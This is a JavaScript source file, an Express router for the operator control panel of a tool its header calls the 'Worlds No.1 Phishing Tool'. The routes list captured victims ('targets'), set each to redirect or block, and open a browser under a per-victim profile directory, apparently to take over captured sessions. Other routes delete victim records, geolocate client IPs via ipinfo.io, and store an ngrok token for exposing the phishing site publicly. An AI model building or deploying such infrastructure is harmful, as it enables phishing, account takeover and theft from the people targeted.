/**
 * 
 * @Author      : Madhan (Madhanmaaz) - madhan hacker
 * github       : https://github.com/madhanmaaz
 * website      : http://madhanmaaz.netlify.app/
 * Description  : Worlds No.1 Phishing Tool.
 * 
 */

const express = require("express")
const fs = require("fs")
const app = express.Router()
const { ssd, books, checkId } = require("../utils/utils")
const open = require("open")
const os = require("os")
const { getAppUrl } = require("../modules/appUrls")
const { getApps } = require("../modules/apps")
const axios = require('axios')
const ipWare = require("ipware")().get_ip

// login and dashboard
app.route("/").get((req, res) => {
    const token = req.cookies.token
    const data = ssd.getItem("config.json")

    if (token == undefined) { // checking token
        res.render("login")
        return
    }

    if (token != data.token) {
        res.clearCookie("token")
        res.redirect("/")
        return
    }

    let redirects = ssd.getItem("redirects.json")
    data["redirects"] = redirects
    let modules = getApps()

    res.render("panel", {
        data,
        modules
    })
}).post((req, res) => {
    const { username, password } = req.body
    const config = ssd.getItem("config.json")

    if (username == config.username && password == config.password) {
        res.cookie("token", config.token, { maxAge: 1000000 * 1000000 })
    }

    res.redirect("/")
})

app.get("/logout", (req, res) => {
    res.clearCookie("token").redirect("/")
})

app.route("/config").get((req, res) => { // get configs
    try {
        const redirects = ssd.getItem("redirects.json")
        res.send(redirects)
    } catch (error) {
        console.log(error)
        res.send("ERROR")
    }
}).post((req, res) => { // set configs
    const body = req.body
    let config = ssd.getItem("config.json")
    config.browser = body.browser
    config.ngrokToken = body.ngrokToken

    ssd.setItem("config.json", config)
    ssd.setItem("redirects.json", body["redirects"])
    res.send("OK")
})

app.route("/get-targets").get((req, res) => {
    const targets = books._keys
    let data = []

    for (const i of targets) {
        let target = books.getItem(i)

        data.push({
            id: target.id,
            appName: target.appName,
            status: target.status,
            time: target.time
        })
    }

    res.send(data)
})

app.route("/set-targets").get(async (req, res) => {
    const { id, task } = req.query
    const data = checkId(id)
    const config = ssd.getItem(`config.json`)

    try {
        if (task == "redirect") {
            data["status"] = "redirect"
            books.setItem(`${id}.json`, data)
        } else if (task == "block") {
            data["status"] = "block"
            books.setItem(`${id}.json`, data)
        } else if (task == "browser") {
            const userDir = `${os.userInfo().homedir}/white-spikes-browser/${data.appName}-${id}`

            const url = getAppUrl(data.appName, "desktop")
            await open("", { "app": { name: config.browser, "arguments": [url, `--user-data-dir=${userDir}`] } })
        } else if (task == "delete") {
            books.removeItem(`${id}.json`)
            const userDir = `${os.userInfo().homedir}/white-spikes-browser/${data.appName}-${id}`
            fs.rmSync(userDir, {
                "recursive": true
            })
        } else if (task == "delete-all") {
            books.clear()
            const userDir = `${os.userInfo().homedir}/white-spikes-browser`
            fs.rmSync(userDir, {
                "recursive": true
            })
        }

    } catch (error) {
        console.log(error)
    }

    res.send("OK")
})

app.route("/ipconfig").get(async (req, res) => {
    try {
        let ip = ipWare(req).clientIp
        let ipConfig = await (await axios.get(`https://ipinfo.io/${ip}/json`)).data
        res.send(ipConfig)
    } catch (error) {
        console.log(error)
        res.send({ "ip": "Ip error reason local ip or get ip error" })
    }
})

app.get("/ngrok", (req, res) => {
    let config = ssd.getItem("config.json")
    res.send(config['ngrok-url'])
})

module.exports = app